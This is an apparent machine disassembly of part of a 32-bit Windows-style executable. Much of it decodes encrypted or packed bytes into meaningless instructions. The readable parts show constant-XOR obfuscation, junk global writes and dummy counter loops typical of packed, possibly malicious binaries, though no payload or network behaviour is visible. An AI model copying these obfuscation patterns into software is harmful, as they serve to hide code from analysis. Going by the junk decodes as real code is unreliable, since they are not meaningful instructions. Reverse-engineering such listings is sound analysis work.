  404b9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b9d:	jp     0x404b2a
  404b9f:	dec    ebp
  404ba0:	adc    BYTE PTR [ebx],ah
  404ba2:	enter  0xc981,0x8f
  404ba6:	sbb    eax,0x3be98116
  404bab:	add    DWORD PTR [eax],eax
  404bad:	add    ah,ch
  404baf:	xchg   ebx,eax
  404bb0:	imul   eax,esp,0x7b
  404bb3:	les    esp,FWORD PTR [ebx-0x55]
  404bb6:	jmp    0xc42ccde5
  404bbb:	mov    ecx,0x1271e93d
  404bc0:	jl     0x404c3e
  404bc2:	adc    DWORD PTR [edi+0x7c],edi
  404bc5:	jl     0x404b77
  404bc7:	jge    0x404b5e
  404bc9:	mov    eax,ds:0x8b0f68b1
  404bce:	adc    eax,0x1bea685f
  404bd3:	push   edi
  404bd4:	imul   esp,DWORD PTR [ebx+0x59],0x6cf58115
  404bdb:	push   ss
  404bdc:	push   es
  404bdd:	dec    ecx
  404bde:	jg     0x404be4
  404be0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404be1:	retf   0xb34a
  404be4:	jbe    0x404bf6
  404be6:	xchg   esp,eax
  404be7:	mov    eax,0x244425c0
  404bec:	adc    DWORD PTR [esi-0x28],edx
  404bef:	dec    ecx
  404bf0:	jo     0x404c0f
  404bf2:	data16 loop 0x404c28
  404bf5:	jecxz  0x404be7
  404bf7:	loop   0x404c3d
  404bf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bfa:	or     al,0x81
  404bfc:	lock jecxz 0x404c4b
  404bff:	xor    DWORD PTR [eax-0x7e],ebx
  404c02:	rcl    DWORD PTR [ebx],0x7e
  404c05:	mov    ebp,0x2fe4d38a
  404c0a:	ins    BYTE PTR es:[edi],dx
  404c0b:	les    edx,FWORD PTR [ebp+0x6ac01c95]
  404c11:	xchg   ecx,eax
  404c12:	cmc    
  404c13:	arpl   WORD PTR [esp+eiz*4],sp
  404c16:	jo     0x404c4f
  404c18:	loope  0x404c1f
  404c1a:	mov    eax,0x6719d958
  404c1f:	jge    0x404bfa
  404c21:	xor    eax,0x58e17289
  404c26:	xchg   ebp,eax
  404c27:	popf   
  404c28:	xor    ch,BYTE PTR [edi+0x1b]
  404c2b:	add    BYTE PTR [ebx-0x544e525c],0x7d
  404c32:	fadd   QWORD PTR [edx+0x1]
  404c35:	in     al,dx
  404c36:	mov    ss,WORD PTR [eax-0xa1e3fc2]
  404c3c:	test   DWORD PTR [ebp-0x350876a1],esi
  404c42:	fistp  DWORD PTR [eax-0x1e3850a0]
  404c48:	fbstp  TBYTE PTR [ecx]
  404c4a:	xor    al,0xa3
  404c4c:	call   0xca6fee5d
  404c51:	cmp    cl,BYTE PTR [esi*4-0x5edc74c6]
  404c58:	dec    esi
  404c59:	jmp    0x404c4a
  404c5b:	(bad)  
  404c5d:	dec    edx
  404c5e:	jb     0x404c77
  404c60:	or     esp,DWORD PTR [ecx+esi*2]
  404c63:	mov    esp,0x6d95a529
  404c68:	xor    bl,BYTE PTR [ebp-0x69]
  404c6b:	ins    DWORD PTR es:[edi],dx
  404c6c:	jb     0x404c60
  404c6e:	mov    al,0xba
  404c70:	cs ret 0x119e
  404c74:	or     ecx,DWORD PTR [edx+0x6c]
  404c77:	sub    ah,cl
  404c79:	mov    DWORD PTR [ebx+0x3b],edx
  404c7c:	mov    bl,0xf2
  404c7e:	inc    esp
  404c7f:	loopne 0x404ce6
  404c81:	jae    0x404c70
  404c83:	push   ss
  404c84:	push   ecx
  404c85:	xchg   esi,eax
  404c86:	retf   0xc28f
  404c89:	popa   
  404c8a:	sub    al,0x95
  404c8c:	push   esp
  404c8d:	(bad)  
  404c8e:	pusha  
  404c8f:	add    ecx,DWORD PTR [ebp-0x51da6d9b]
  404c95:	sub    esi,edi
  404c97:	mov    edx,0x969fb848
  404c9c:	test   DWORD PTR [eax-0x14],0x3295e805
  404ca3:	jo     0x404c8b
  404ca5:	popf   
  404ca6:	jo     0x404c31
  404ca8:	xchg   DWORD PTR [ebx+0x75],esp
  404cab:	fbld   TBYTE PTR [esi]
  404cad:	jg     0x404c5a
  404caf:	cwde   
  404cb0:	in     eax,dx
  404cb1:	lahf   
  404cb2:	aaa    
  404cb3:	lea    ebx,[ecx-0x6cfacdd5]
  404cb9:	and    eax,0xc685ce7d
  404cbe:	dec    ebp
  404cbf:	iret   
  404cc0:	jl     0x404d33
  404cc2:	inc    ecx
  404cc3:	push   ss
  404cc4:	jp     0x404ccb
  404cc6:	mov    esi,ecx
  404cc8:	popf   
  404cc9:	jnp    0x404d09
  404ccb:	imul   eax,edi,0x29
  404cce:	ficom  WORD PTR [ecx]
  404cd0:	push   0xeeb5e0c
  404cd5:	inc    ebx
  404cd6:	and    BYTE PTR [edx],cl
  404cd8:	sub    ch,cl
  404cda:	mov    esi,0xae9a30
  404cdf:	fnstcw WORD PTR [esi]
  404ce1:	mov    fs,WORD PTR [ebx+0x2e]
  404ce4:	aam    0xfd
  404ce6:	xchg   edx,eax
  404ce7:	add    cl,bh
  404ce9:	mov    eax,ecx
  404ceb:	pop    ebp
  404cec:	ret    0x18
  404cef:	push   ebp
  404cf0:	mov    ebp,esp
  404cf2:	push   ecx
  404cf3:	add    DWORD PTR ds:0x4292b1,edx
  404cf9:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  404d00:	mov    eax,DWORD PTR [ebp-0x4]
  404d03:	and    ecx,ecx
  404d05:	mov    edx,DWORD PTR [ebp+0x10]
  404d08:	mov    DWORD PTR ds:0x4292d5,0x4d89
  404d12:	mov    ecx,0x7510857
  404d17:	xor    eax,ecx
  404d19:	add    eax,0x32729e
  404d1e:	jmp    0x404e84
  404d23:	jne    0x404d9b
  404d25:	xchg   DWORD PTR [ebx+ebx*4],ebx
  404d28:	mov    eax,ds:0x71892dbd
  404d2d:	arpl   WORD PTR [eax],ax
  404d2f:	xlat   BYTE PTR ds:[ebx]
  404d30:	fisub  DWORD PTR [eax+0x7c1512ca]
  404d36:	jl     0x404d6f
  404d38:	jg     0x404db6
  404d3a:	jl     0x404db4
  404d3c:	mov    ch,0x85
  404d3e:	in     eax,dx
  404d3f:	js     0x404dbe
  404d41:	bound  edx,QWORD PTR [edi-0x6a]
  404d44:	and    eax,DWORD PTR [eax-0x3b6cde45]
  404d4a:	jno    0x404d7c
  404d4c:	call   DWORD PTR [ebx-0x5ee22c49]
  404d52:	add    DWORD PTR [edi+ecx*2+0x3d4cdc03],0xffffffb1
  404d5a:	xor    eax,0x998e82f2
  404d5f:	fimul  DWORD PTR [eax+0x6178d53b]
  404d65:	stc    
  404d66:	lea    edi,[esp+esi*4-0x7402195b]
  404d6d:	add    eax,0x23db5a3b
  404d72:	sbb    DWORD PTR [ebx+ebp*1],ecx
  404d75:	out    0xd9,eax
  404d77:	es mov fs,esp
  404d7a:	cmp    eax,0x32fb99d6
  404d7f:	adc    BYTE PTR [ecx+0x20aa82c],ch
  404d85:	imul   ebx,DWORD PTR [edx+0xdb368cd],0x3d72550a
  404d8f:	out    0x4d,eax
  404d91:	(bad)  
  404d92:	sbb    al,0xdd
  404d94:	stos   DWORD PTR es:[edi],eax
  404d95:	cmp    BYTE PTR [edi],dh
  404d97:	sub    BYTE PTR [edx+eiz*2+0x35502d04],dh
  404d9e:	mov    ah,0x99
  404da0:	loop   0x404db2
  404da2:	icebp  
  404da3:	cwde   
  404da4:	sbb    al,ch
  404da6:	inc    ebx
  404da7:	push   0x2117eb1e
  404dac:	xor    BYTE PTR es:[edx+ebp*4-0x46],0x10
  404db2:	mov    DWORD PTR [esi+0x33fc6dbf],ebx
  404db8:	lods   al,BYTE PTR ds:[esi]
  404db9:	clc    
  404dba:	in     eax,dx
  404dbb:	sar    BYTE PTR [esp+ebx*2+0x28b61ac1],0x84
  404dc3:	shl    BYTE PTR [edx],1
  404dc5:	ins    BYTE PTR es:[edi],dx
  404dc6:	add    BYTE PTR [eax+0x4ed9b834],bl
  404dcc:	stos   BYTE PTR es:[edi],al
  404dcd:	inc    esi
  404dce:	pop    ecx
  404dcf:	inc    edx
  404dd0:	mov    WORD PTR [edx],?
  404dd2:	retf   
  404dd3:	scas   eax,DWORD PTR es:[edi]
  404dd4:	cmc    
  404dd5:	push   ss
  404dd6:	in     eax,dx
  404dd7:	fcomp  QWORD PTR [ecx+ebp*4+0x1e344aa8]
  404dde:	in     al,dx
  404ddf:	xchg   BYTE PTR [ebp+0x50ec5b02],dh
  404de5:	jne    0x404dea
  404de7:	sub    esi,DWORD PTR [esi+0x12179a2c]
  404ded:	mov    ch,0x27
  404def:	dec    eax
  404df0:	stos   DWORD PTR es:[edi],eax
  404df1:	jno    0x404e43
  404df3:	call   0x3bbf:0xc4e3a3d7
  404dfa:	mov    dh,0xe5
  404dfc:	das    
  404dfd:	sbb    DWORD PTR [edi+0x7c105372],0x36
  404e04:	cmp    eax,DWORD PTR [ecx]
  404e06:	xor    ch,dl
  404e08:	(bad)  
  404e09:	iret   
  404e0a:	push   esp
  404e0b:	nop
  404e0c:	stc    
  404e0d:	fst    st(1)
  404e0f:	dec    ecx
  404e10:	aaa    
  404e11:	scas   eax,DWORD PTR es:[edi]
  404e12:	into   
  404e13:	dec    ecx
  404e14:	xchg   esp,eax
  404e15:	xchg   ecx,eax
  404e16:	addr16 loop 0x404e8c
  404e19:	cmp    al,0x25
  404e1b:	and    bl,ch
  404e1d:	jmp    0x9639:0x3ff46e4c
  404e24:	push   es
  404e25:	adc    ch,dl
  404e27:	xor    ebx,eax
  404e29:	xor    eax,0xe30cf532
  404e2e:	or     al,0xd6
  404e31:	dec    ebp
  404e32:	cwde   
  404e33:	cmp    eax,0xecc1cc2a
  404e38:	popf   
  404e39:	(bad)  [ecx+esi*4+0x30639f53]
  404e40:	or     al,0xc
  404e42:	pop    edi
  404e43:	mov    BYTE PTR ds:0x9a275d4f,ch
  404e49:	dec    ecx
  404e4a:	xchg   esp,eax
  404e4b:	xchg   esp,eax
  404e4c:	mov    eax,0xa878f29e
  404e51:	das    
  404e52:	(bad)  
  404e53:	shr    BYTE PTR [esi-0xf],1
  404e56:	call   0x159a:0x7942656a
  404e5d:	push   ds
  404e5e:	dec    edi
  404e5f:	outs   dx,BYTE PTR ds:[esi]
  404e60:	sub    esi,DWORD PTR [ecx]
  404e62:	ss sbb eax,0x71f87611
  404e68:	add    DWORD PTR [ebx+0x68],ebp
  404e6b:	dec    esp
  404e6c:	dec    edi
  404e6d:	push   ebx
  404e6e:	sahf   
  404e6f:	test   DWORD PTR [edx],ebp
  404e71:	jae    0x404ea4
  404e73:	shr    DWORD PTR [esi],1
  404e75:	xchg   ebp,eax
  404e76:	(bad)  
  404e77:	cld    
  404e78:	out    0xd2,eax
  404e7a:	(bad)  
  404e7b:	in     al,dx
  404e7c:	push   eax
  404e7d:	in     al,dx
  404e7e:	jl     0x404e3c
  404e80:	pop    edx
  404e81:	mov    eax,0x289799e
  404e86:	or     DWORD PTR ds:0x4292a9,ebx
  404e8c:	mov    eax,DWORD PTR [ebp+0x14]
  404e8f:	not    edx
  404e91:	mov    edx,DWORD PTR [ebp+0x10]
  404e94:	mov    DWORD PTR [edx+0x4],eax
  404e97:	mov    eax,DWORD PTR [ebp+0x18]
  404e9a:	sbb    DWORD PTR ds:0x42c88e,0xab4
  404ea4:	mov    edx,DWORD PTR [ebp+0x10]
  404ea7:	mov    DWORD PTR [edx+0x8],eax
  404eaa:	sub    edx,eax
  404eac:	mov    eax,DWORD PTR [ebp+0x1c]
  404eaf:	mov    edx,DWORD PTR ds:0x4275b0
  404eb5:	and    DWORD PTR ds:0x427594,edx
  404ebb:	jmp    0x405021
  404ec0:	fdiv   DWORD PTR [ebx+0x2e]
  404ec3:	dec    esp
  404ec4:	stc    
  404ec5:	gs jp  0x404e53
  404ec8:	jg     0x404e7d
  404eca:	pushf  
  404ecb:	mov    ecx,0xc7e6c1fd
  404ed0:	in     eax,dx
  404ed1:	adc    al,0x7c
  404ed3:	jl     0x404f0c
  404ed5:	jg     0x404f53
  404ed7:	jl     0x404f55
  404ed9:	aam    0x5f
  404edb:	aad    0xf8
  404edd:	aam    0x83
  404edf:	pop    ebx
  404ee0:	repz xchg esp,eax
  404ee2:	mov    ebx,0xf8aa5c58
  404ee7:	xchg   ecx,ecx
  404ee9:	lods   eax,DWORD PTR ds:[esi]
  404eea:	pop    ebp
  404eeb:	sub    eax,0x652c0df0
  404ef0:	sub    eax,0x218c7961
  404ef5:	or     al,0x7e
  404ef7:	sbb    al,0x2d
  404ef9:	imul   edx,ebx,0x7b8bd44f
  404eff:	dec    esp
  404f00:	cmp    eax,0x561b26a2
  404f05:	fldenv [eax-0x7f64db6f]
  404f0b:	out    dx,eax
  404f0c:	pusha  
  404f0d:	out    0xcc,eax
  404f0f:	leave  
  404f10:	mov    WORD PTR [ebx-0x3d],gs
  404f13:	cdq    
  404f14:	js     0x404ecf
  404f16:	jb     0x404f1d
  404f18:	test   BYTE PTR [ebx+0x25],dl
  404f1b:	out    0x8f,eax
  404f1d:	rcl    DWORD PTR [edx+0xfeb11ec],cl
  404f23:	adc    eax,0xba32fd93
  404f28:	jnp    0x404f8d
  404f2a:	imul   esi,esi,0xfd73bb10
  404f30:	xchg   esi,eax
  404f31:	inc    ecx
  404f32:	mov    ah,0xb7
  404f34:	iret   
  404f35:	cdq    
  404f36:	ins    DWORD PTR es:[edi],dx
  404f37:	cmp    eax,0x1835d1e0
  404f3c:	xchg   edi,eax
  404f3d:	scas   al,BYTE PTR es:[edi]
  404f3e:	call   0x2a2256d0
  404f43:	imul   ecx,DWORD PTR [ecx+0x7c],0x40
  404f47:	pop    eax
  404f48:	imul   edx,DWORD PTR [edx-0x5f],0x59
  404f4c:	stos   DWORD PTR es:[edi],eax
  404f4d:	jmp    0x9ebdef98
  404f52:	jb     0x404fbd
  404f54:	dec    esi
  404f55:	pop    edx
  404f56:	add    al,0xb3
  404f58:	in     al,0xff
  404f5a:	sub    BYTE PTR [edi-0x38],ah
  404f5d:	or     dl,ch
  404f5f:	add    BYTE PTR [ebp-0x66],ch
  404f62:	xchg   esp,eax
  404f63:	mov    ecx,DWORD PTR [ecx-0x794676bd]
  404f69:	cld    
  404f6a:	mov    eax,0x7c5f4001
  404f6f:	neg    BYTE PTR [edx+0xd79526a]
  404f75:	cwde   
  404f76:	sub    BYTE PTR [ecx+0x341b3e6],0xa2
  404f7d:	std    
  404f7e:	add    ebx,edx
  404f80:	or     esp,DWORD PTR [eax-0xa04df84]
  404f86:	pop    ds
  404f87:	dec    ebx
  404f88:	dec    ecx
  404f89:	scas   eax,DWORD PTR es:[edi]
  404f8a:	xor    BYTE PTR cs:[edi+0xa32ac2f],0x55
  404f92:	mov    ch,0xcd
  404f94:	rol    BYTE PTR cs:[ebp-0x58],0x89
  404f99:	xchg   edi,eax
  404f9a:	inc    eax
  404f9b:	add    bl,ch
  404f9d:	push   es
  404f9e:	cmc    
  404f9f:	ret    0xe50
  404fa2:	dec    esp
  404fa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fa4:	xor    eax,0xce76068c
  404fa9:	pop    esp
  404faa:	out    0xbb,eax
  404fac:	jecxz  0x404f66
  404fae:	xor    eax,0x39211265
  404fb3:	cmp    ecx,edi
  404fb5:	outs   dx,BYTE PTR ds:[esi]
  404fb6:	test   DWORD PTR [eax+0x4c],edi
  404fb9:	loope  0x405029
  404fbb:	int    0x38
  404fbd:	cmp    DWORD PTR [ecx],0x4460d574
  404fc3:	adc    dl,0xd3
  404fc6:	push   ss
  404fc7:	(bad)  
  404fc8:	mov    eax,ds:0x91336654
  404fcd:	add    esi,DWORD PTR [edi-0x59]
  404fd0:	mov    bl,0x15
  404fd2:	xor    eax,DWORD PTR [esi-0x5d235ca4]
  404fd8:	jmp    0x404fc2
  404fda:	cmp    bh,BYTE PTR [ecx+ebp*4+0x37]
  404fde:	mov    ecx,0x779223a6
  404fe3:	test   al,0x37
  404fe5:	or     eax,DWORD PTR [esi+eax*1+0x58]
  404fe9:	adc    eax,0x8832f258
  404fee:	jle    0x40506e
  404ff0:	(bad)  
  404ff2:	je     0x404fe2
  404ff4:	jnp    0x405066
  404ff6:	cdq    
  404ff7:	add    esp,DWORD PTR [ebp+edi*4+0x4a]
  404ffb:	lock add BYTE PTR ds:[edi+0x31e44564],bl
  405003:	jl     0x404f85
  405005:	xor    cl,BYTE PTR [esi-0x73669793]
  40500b:	test   BYTE PTR [ebp-0xd],0x9f
  40500f:	gs and eax,edx
  405012:	jne    0x405025
  405014:	leave  
  405015:	dec    esp
  405016:	dec    edx
  405017:	push   ds
  405018:	test   dh,cl
  40501a:	loopne 0x404fae
  40501c:	test   eax,0x8ebbe190
  405021:	mov    edx,DWORD PTR [ebp+0x10]
  405024:	mov    DWORD PTR [edx+0xc],eax
  405027:	adc    DWORD PTR ds:0x427d0f,ebx
  40502d:	mov    eax,DWORD PTR [ebp+0x20]
  405030:	sbb    DWORD PTR ds:0x427598,0x4ffb
  40503a:	jmp    0x4051a0
  40503f:	jno    0x40503e
  405041:	xlat   BYTE PTR ds:[ebx]
  405042:	sti    
  405043:	sti    
  405044:	std    
  405045:	add    eax,0xd7a6c1fd
  40504a:	mov    dl,0x88
  40504c:	push   0x17a431f2
  405051:	jl     0x4050cf
  405053:	aaa    
  405054:	jg     0x4050d2
  405056:	jl     0x4050d2
  405058:	(bad)  
  405059:	es mov dl,0x23
  40505c:	lea    eax,[esi+0x31]
  40505f:	loope  0x404fea
  405061:	frstor [eax-0x54]
  405064:	pop    esp
  405065:	clc    
  405066:	imul   ebx,DWORD PTR [edx+0x33],0x6c
  40506a:	push   cs
  40506b:	hlt    
  40506c:	or     al,0x67
  40506e:	and    DWORD PTR [esi],esi
  405070:	js     0x4050d9
  405072:	add    BYTE PTR ds:0xda48f6d4,dh
  405078:	jp     0x405083
  40507a:	aas    
  40507b:	add    al,0x14
  40507d:	jle    0x4050fc
  40507f:	cmp    eax,0x3dc6a748
  405084:	xor    DWORD PTR [eax],edi
  405086:	jb     0x40506d
  405088:	aaa    
  405089:	sub    DWORD PTR [ebp-0x3a],ebx
  40508c:	out    dx,eax
  40508d:	add    eax,0x72e80c5b
  405092:	jmp    0x405093
  405094:	mov    eax,0x1240b10
  405099:	inc    edx
  40509a:	icebp  
  40509b:	or     eax,0x292fab0a
  4050a0:	frstor [edx+0x653efad4]
  4050a6:	mov    cl,0x80
  4050a8:	inc    esp
  4050a9:	pop    esi
  4050aa:	pop    ds
  4050ab:	sbb    BYTE PTR [ebp-0x4e],0x2
  4050af:	shr    DWORD PTR [ecx],1
  4050b1:	mov    ecx,0x5d865e6c
  4050b6:	aas    
  4050b7:	sub    esi,DWORD PTR [ecx+0xa]
  4050ba:	icebp  
  4050bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050bc:	inc    ecx
  4050bd:	push   cs
  4050be:	jmp    0x4050f4
  4050c0:	jg     0x40507b
  4050c2:	(bad)  
  4050c3:	aam    0xfb
  4050c5:	push   es
  4050c6:	cmp    eax,DWORD PTR [esi-0x6f63d63f]
  4050cc:	push   ss
  4050cd:	dec    esp
  4050ce:	pop    esi
  4050cf:	xlat   BYTE PTR ds:[ebx]
  4050d0:	sahf   
  4050d1:	mov    ds:0x9eef419a,al
  4050d6:	cdq    
  4050d7:	(bad)  
  4050d8:	jns    0x405137
  4050da:	jmp    0x4050a1
  4050dc:	jbe    0x405092
  4050de:	mov    esp,0xccd64560
  4050e3:	pop    esp
  4050e4:	add    eax,0xcad7ab9a
  4050e9:	pop    es
  4050ea:	rcr    DWORD PTR [ecx+eiz*8],cl
  4050ed:	shl    DWORD PTR [esi+0x45],cl
  4050f0:	sahf   
  4050f1:	dec    ebx
  4050f2:	bound  esp,QWORD PTR [ecx+0x55]
  4050f5:	retf   0x3e7f
  4050f8:	ss sar esp,cl
  4050fb:	fs stos BYTE PTR es:[edi],al
  4050fd:	cli    
  4050fe:	cwde   
  4050ff:	and    edx,esi
  405101:	lock dec ebx
  405103:	inc    ecx
  405104:	cmp    eax,0x72af848
  405109:	fcomp  DWORD PTR [edx-0x23]
  40510c:	rol    esp,0xd6
  40510f:	or     BYTE PTR [edi-0x22],dl
  405112:	or     al,0xce
  405114:	mov    dh,0xf3
  405116:	repz or DWORD PTR cs:[edx+0x61190b13],0xf6f71dae
  405122:	call   0x316a:0xf9ed24ea
  405129:	cdq    
  40512a:	add    eax,0x1d6e770c
  40512f:	push   ds
  405130:	jmp    0x5c01cf0c
  405135:	je     0x4050c2
  405137:	cli    
  405138:	jecxz  0x405162
  40513a:	scas   eax,DWORD PTR es:[edi]
  40513b:	lahf   
  40513c:	test   eax,0x6752145a
  405141:	xchg   DWORD PTR [edx+0x6adf8639],esp
  405147:	or     DWORD PTR [ebx-0x39],ebp
  40514a:	xchg   edx,eax
  40514b:	inc    edi
  40514c:	ret    0xa625
  40514f:	cmp    al,0xc3
  405151:	das    
  405152:	cmp    eax,DWORD PTR [ebx]
  405154:	call   0xe000051f
  405159:	pop    eax
  40515a:	push   esp
  40515b:	daa    
  40515c:	push   ebp
  40515d:	lods   al,BYTE PTR ds:[esi]
  40515e:	mov    ecx,0x7eb1d013
  405163:	pushf  
  405164:	pop    es
  405165:	daa    
  405166:	or     dl,dl
  405168:	dec    esp
  405169:	push   eax
  40516a:	push   ss
  40516b:	sub    DWORD PTR [ebx-0x45],ecx
  40516e:	loop   0x4050f5
  405170:	mov    bl,BYTE PTR [ebx+0x68]
  405173:	mov    eax,ds:0xbf84026f
  405178:	adc    BYTE PTR [eax-0x7e],ch
  40517b:	xchg   DWORD PTR [ebp-0x4d],eax
  40517e:	imul   esp,DWORD PTR [ebp-0x1f],0x9ff25b3c
  405185:	lds    edi,FWORD PTR [edi]
  405187:	dec    eax
  405188:	(bad)  
  405189:	aad    0x3b
  40518b:	clc    
  40518c:	outs   dx,BYTE PTR ds:[esi]
  40518d:	fsubr  DWORD PTR [edx-0x6e]
  405190:	mov    bh,0x5a
  405192:	sub    al,0xf0
  405194:	test   BYTE PTR [edi+0x7a68b24e],al
  40519a:	neg    DWORD PTR [ecx+0x51]
  40519d:	call   0x55cb8aa3
  4051a2:	adc    BYTE PTR [ecx-0x3f74efbe],cl
  4051a8:	mov    eax,DWORD PTR [ebp+0x14]
  4051ab:	test   eax,eax
  4051ad:	mov    eax,DWORD PTR [ebp+0x8]
  4051b0:	jne    0x4051b9
  4051b6:	mov    eax,DWORD PTR [ebp+0xc]
  4051b9:	xor    eax,ecx
  4051bb:	add    eax,0x32729e
  4051c0:	leave  
  4051c1:	ret    0x1c
  4051c4:	push   ebp
  4051c5:	mov    ebp,esp
  4051c7:	sub    esp,0x10c
  4051cd:	adc    DWORD PTR ds:0x427cff,0x42c892
  4051d7:	push   ebx
  4051d8:	push   esi
  4051d9:	push   edi
  4051da:	push   0x409348
  4051df:	adc    DWORD PTR ds:0x4275a0,0x3f8f
  4051e9:	call   DWORD PTR ds:0x427cab
  4051ef:	test   eax,eax
  4051f1:	mov    DWORD PTR ds:0x427594,0x1688
  4051fb:	je     0x405208
  405201:	xor    eax,eax
  405203:	jmp    0x4063e6
  405208:	and    DWORD PTR ds:0x4292a5,0x4292c9
  405212:	push   0x4092b4
  405217:	adc    DWORD PTR ds:0x4292cd,0x1b3a
  405221:	call   DWORD PTR ds:0x427a33
  405227:	and    DWORD PTR ds:0x427d07,0x4292c5
  405231:	test   ax,ax
  405234:	mov    DWORD PTR ds:0x42c882,0x6514
  40523e:	je     0x40526d
  405244:	push   0x3546
  405249:	push   0x65890909
  40524e:	or     DWORD PTR ds:0x42c882,0x42c89a
  405258:	call   DWORD PTR ds:0x4279ef
  40525e:	mov    DWORD PTR ds:0x4292dd,0x79a2
  405268:	jmp    0x4063e6
  40526d:	mov    ecx,0xf89c8535
  405272:	mov    DWORD PTR [ebp-0x20],ecx
  405275:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  40527c:	sub    ebx,edx
  40527e:	lea    eax,[ebp-0x58]
  405281:	neg    esi
  405283:	mov    DWORD PTR [ebp-0x60],eax
  405286:	and    DWORD PTR ds:0x4292c1,0x0
  405290:	mov    edx,DWORD PTR ds:0x4292c1
  405296:	inc    edx
  405297:	mov    DWORD PTR ds:0x4292c1,edx
  40529d:	cmp    DWORD PTR ds:0x4292c1,0x1e
  4052a4:	jne    0x4052bd
  4052aa:	push   0x63b5
  4052af:	push   DWORD PTR [ebp-0x28]
  4052b2:	push   0x5536
  4052b7:	call   DWORD PTR ds:0x427a97
  4052bd:	cmp    DWORD PTR ds:0x4292c1,0x10
  4052c4:	jb     0x405290
  4052ca:	movzx  ebx,WORD PTR ds:0x42c88a
  4052d1:	adc    DWORD PTR ds:0x4292c1,ebx
  4052d7:	lea    eax,[ebp-0x50]
  4052da:	sbb    ebx,DWORD PTR ds:0x4275b0
  4052e0:	mov    DWORD PTR [ebp-0x10],eax
  4052e3:	mov    eax,ds:0x4091a0
  4052e8:	sbb    ebx,esi
  4052ea:	mov    eax,DWORD PTR [eax+0x1c8]
  4052f0:	and    DWORD PTR ds:0x4275a4,0x0
  4052fa:	mov    esi,DWORD PTR ds:0x4275a4
  405300:	inc    esi
  405301:	mov    DWORD PTR ds:0x4275a4,esi
  405307:	cmp    DWORD PTR ds:0x4275a4,0x4
  40530e:	jne    0x40531f
  405314:	push   0x1257
  405319:	call   DWORD PTR ds:0x4279d7
  40531f:	cmp    DWORD PTR ds:0x4275a4,0x3
  405326:	jne    0x405339
  40532c:	mov    esi,DWORD PTR ds:0x4275a4
  405332:	inc    esi
  405333:	mov    DWORD PTR ds:0x4275a4,esi
  405339:	cmp    DWORD PTR ds:0x4275a4,0x1a
  405340:	jb     0x4052fa
  405346:	sbb    esi,DWORD PTR ds:0x4292dd
  40534c:	mov    eax,DWORD PTR [eax]
  40534e:	mov    edx,DWORD PTR [ebp-0x10]
  405351:	sbb    ebx,0x4bc4
  405357:	mov    esi,0x7510857
  40535c:	xor    eax,esi
  40535e:	and    DWORD PTR ds:0x4292c5,0x0
  405368:	jmp    0x40537c
  40536d:	xor    ebx,ebx
  40536f:	add    ebx,DWORD PTR ds:0x4292c5
  405375:	inc    ebx
  405376:	mov    DWORD PTR ds:0x4292c5,ebx
  40537c:	cmp    DWORD PTR ds:0x4292c5,0x10
  405383:	jae    0x4053d4
  405389:	cmp    DWORD PTR ds:0x4292c5,0xb
  405390:	jne    0x4053af
  405396:	push   0x1343
  40539b:	push   DWORD PTR [ebp-0xc]
  40539e:	push   DWORD PTR [ebp-0x14]
  4053a1:	push   0x4e35
  4053a6:	push   DWORD PTR [ebp-0x28]
  4053a9:	call   DWORD PTR ds:0x4278f7
  4053af:	cmp    DWORD PTR ds:0x4292c5,0xa
  4053b6:	jne    0x4053c9
  4053bc:	mov    ebx,DWORD PTR ds:0x4292c5
  4053c2:	inc    ebx
  4053c3:	mov    DWORD PTR ds:0x4292c5,ebx
  4053c9:	jmp    0x40536d
  4053ce:	adc    ebx,DWORD PTR ds:0x427598
  4053d4:	mov    ebx,0x32729e
  4053d9:	sbb    DWORD PTR ds:0x42c89e,0x427d13
  4053e3:	add    eax,ebx
  4053e5:	mov    DWORD PTR ds:0x4292b9,0x4aac
  4053ef:	mov    DWORD PTR [edx],eax
  4053f1:	mov    eax,ds:0x409464
  4053f6:	mov    DWORD PTR ds:0x42c882,0x6078
  405400:	cmp    eax,0x23d14057
  405405:	mov    eax,DWORD PTR [ebp-0x18]
  405408:	mov    DWORD PTR ds:0x4292dd,0x3967
  405412:	je     0x405434
  405418:	mov    ecx,DWORD PTR [ebp-0x20]
  40541b:	xor    eax,esi
  40541d:	add    eax,ebx
  40541f:	imul   eax,ecx
  405422:	mov    DWORD PTR ds:0x4292c5,0x1be9
  40542c:	mov    DWORD PTR [ebp-0x20],eax
  40542f:	jmp    0x405ffd
  405434:	xor    eax,esi
  405436:	add    eax,ebx
  405438:	mov    DWORD PTR ds:0x42c886,0x19
  405442:	cmp    DWORD PTR ds:0x42c886,0x0
  405449:	je     0x405480
  40544f:	cmp    DWORD PTR ds:0x42c886,0x23
  405456:	jne    0x405468
  40545c:	push   DWORD PTR [ebp-0x20]
  40545f:	push   DWORD PTR [ebp-0x24]
  405462:	call   DWORD PTR ds:0x427a9b
  405468:	mov    edx,DWORD PTR ds:0x42c886
  40546e:	dec    edx
  40546f:	mov    DWORD PTR ds:0x42c886,edx
  405475:	jmp    0x405442
  40547a:	or     edx,0x41a6
  405480:	mov    ds:0x4092b0,eax
  405485:	mov    eax,DWORD PTR [ebp-0x20]
  405488:	add    edx,DWORD PTR ds:0x42c89a
  40548e:	xor    eax,esi
  405490:	and    edx,0x2762
  405496:	add    eax,ebx
  405498:	and    DWORD PTR ds:0x42c88e,0x0
  4054a2:	jmp    0x4054b4
  4054a7:	mov    edx,DWORD PTR ds:0x42c88e
  4054ad:	inc    edx
  4054ae:	mov    DWORD PTR ds:0x42c88e,edx
  4054b4:	cmp    DWORD PTR ds:0x42c88e,0x1d
  4054bb:	jae    0x405501
  4054c1:	cmp    DWORD PTR ds:0x42c88e,0xd
  4054c8:	jne    0x4054dc
  4054ce:	push   DWORD PTR [ebp-0x18]
  4054d1:	push   0x590a
  4054d6:	call   DWORD PTR ds:0x427a9f
  4054dc:	cmp    DWORD PTR ds:0x42c88e,0xc
  4054e3:	jne    0x4054f6
  4054e9:	mov    edx,DWORD PTR ds:0x42c88e
  4054ef:	inc    edx
  4054f0:	mov    DWORD PTR ds:0x42c88e,edx
  4054f6:	jmp    0x4054a7
  4054fb:	add    DWORD PTR ds:0x427d13,edi
  405501:	mov    ds:0x409464,eax
  405506:	and    DWORD PTR ds:0x4292b9,0x0
  405510:	jmp    0x405522
